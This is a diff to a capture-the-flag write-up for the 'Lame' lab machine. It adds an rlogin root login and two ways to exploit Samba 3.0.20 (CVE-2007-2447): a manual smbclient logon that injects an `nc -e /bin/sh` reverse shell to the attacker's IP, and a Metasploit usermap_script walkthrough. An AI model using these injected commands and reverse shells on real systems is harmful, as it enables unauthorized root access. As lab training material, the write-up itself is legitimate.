@@ -77,8 +77,9 @@ PORT     STATE SERVICE
 6667/tcp open  irc
 8009/tcp open  ajp13
 ```
-Port 513, rlogin, is dated and vulnerable by default and doesn't require password by default. This can be exploited with `rlogin localhsot -l root`.
+Port 513, rlogin, is dated and vulnerable by default and doesn't require password by default. This can be exploited with `rlogin localhost -l root`.
 ```
+daemon@lame:/tmp$ rlogin localhost -l root
 rlogin localhost -l root
 Last login: Thu Sep 30 10:48:49 EDT 2021 from :0.0 on pts/0
 Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
@@ -93,13 +94,83 @@ applicable law.
 To access official Ubuntu documentation, please visit:
 http://help.ubuntu.com/
 You have new mail.
-root@lame:~# 
+root@lame:~#
 ```
 We have successfully rooted the machine.
 
 # Bonus
 Something to note about this box is how many attack vectors there are and false leads. Version numbers for many services running were exploitable, but I had not done that on my initial attempt. 
 
-## Alternate Approach 
+## Alternate Approach: SMB 3.0.20, No metasploit
+Doing a more detailed nmap scan, checking version numbers and using scripts with `nmap -sC -sV`, we can find that Samba is running.
+```
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+```
+Googling the version (3.0.20), we can find that this version along with others between 3.0.0 and 3.0.25, are vulnerable to remote code execution (CVE-2007-2447). First, enumeration of the available shares is necessary through `smbmap -H 10.10.10.3`:
+```
+[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+```
+Since access to the /tmp share is given, an attacker can connect to it and utilize the CVE. Connect to it via `smbclient //10.10.10.3/tmp`:
+```
+Enter WORKGROUP\kali's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> 
+```
+Anonymous logon was granted so that is why access was possible. From the Samba terminal, RCE is possible in this version. Running the command ``logon "./=`nohup nc -e /bin/sh <local ip> <local port>`"`` in the Samba terminal while having a listener on the attacking machine with `nc -nvlp <local port>` returns an error in the Samba terminal
+```
+smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.4 4444`"
+Password: 
+session setup failed: NT_STATUS_IO_TIMEOUT
+```
+But on the listener, the attacker actually gains a root shell.
+```
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 38533
+whoami
+root
+```
 
+## Alternate Approach: SMB 3.0.20, with Metasploit
+Metasploit makes usages of the CVE much easier. Simply searching for this Samba version in the Metasploit console with `search exploit samba 3.0.20` returns
+```
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+```
+Using this exploit while setting our options
+```
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  <local ip>       yes       The listen address (an interface may be specified)
+   LPORT  <local port>     yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+Will give us a root shell just like the previous method shown.
 ## Failed Attack Vectors
